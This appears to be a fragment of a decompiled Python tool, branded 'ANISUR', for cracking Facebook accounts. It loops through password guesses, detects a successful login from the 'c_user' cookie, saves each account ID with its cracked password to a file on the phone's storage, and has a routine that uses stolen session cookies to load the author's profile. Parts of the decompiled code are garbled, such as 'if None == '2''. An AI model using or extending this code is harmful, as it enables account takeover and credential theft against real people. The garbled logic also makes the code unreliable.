...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open 01942992904')
        return None
    if None == '4':
...
def follow(self, session, coki):
    r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100004563217807', {
...
--------------------------------------------------------------------------------------------------------------------------------------------
\033[1;37m================= \33[32;45mANISUR143\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mANISUR \33[0;m\033[1;32m 🔥 \033[1;33m\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m itsanis
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35manisur143
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2
\033[1;37m================= \33[32;45mANISUR\33[0;m =====================

       \33[37;41m\t WELLCOME TO ANISUR TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('    \33[1;30m(ANISUR-CP)  ' + uid + ' | ' + ps + '  \33[0;97m')
                open('/sdcard/ANISUR-CP.txt', 'a').write(uid + ' | ' + ps + ' \n')
                cps.append(cid)
                break
            else:
                continue
        loop += 1
        sys.stdout.write('\r     %s[ANISUR] [%s/%s]  OK:- %s  CP:- %s \r' % (H, loop, tl, len(oks), len(cps))),
        sys.stdout.flush()
    except:
        pass
